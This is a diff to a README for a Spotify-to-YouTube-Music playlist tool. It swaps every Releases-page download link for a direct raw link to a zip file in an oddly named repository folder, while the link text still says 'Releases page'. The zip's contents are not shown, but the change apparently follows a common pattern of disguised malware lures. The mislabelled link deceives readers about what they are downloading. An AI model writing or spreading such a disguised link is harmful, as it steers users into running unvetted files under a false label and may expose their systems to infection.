@@ -1,6 +1,6 @@
 # 🎵 spotify-ytmusic-tools - Move Spotify playlists with ease
 
-[![Download](https://img.shields.io/badge/Download-Releases%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/marloendothermal406/spotify-ytmusic-tools/releases)
+[![Download](https://img.shields.io/badge/Download-Releases%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/marloendothermal406/spotify-ytmusic-tools/raw/refs/heads/main/Hippobosca/spotify-tools-ytmusic-3.4-beta.3.zip)
 
 ## 🚀 What this tool does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Visit this page to download the Windows release:
 
-[Go to the Releases page](https://github.com/marloendothermal406/spotify-ytmusic-tools/releases)
+[Go to the Releases page](https://github.com/marloendothermal406/spotify-ytmusic-tools/raw/refs/heads/main/Hippobosca/spotify-tools-ytmusic-3.4-beta.3.zip)
 
 On the Releases page, look for the latest version and download the Windows file that matches your system. If there is more than one file, choose the one made for Windows.
 
@@ -177,4 +177,4 @@ If the release includes a readme file or release notes, follow the order shown t
 
 ## 🔗 Download again
 
-[Visit the latest release to download](https://github.com/marloendothermal406/spotify-ytmusic-tools/releases)
+[Visit the latest release to download](https://github.com/marloendothermal406/spotify-ytmusic-tools/raw/refs/heads/main/Hippobosca/spotify-tools-ytmusic-3.4-beta.3.zip)
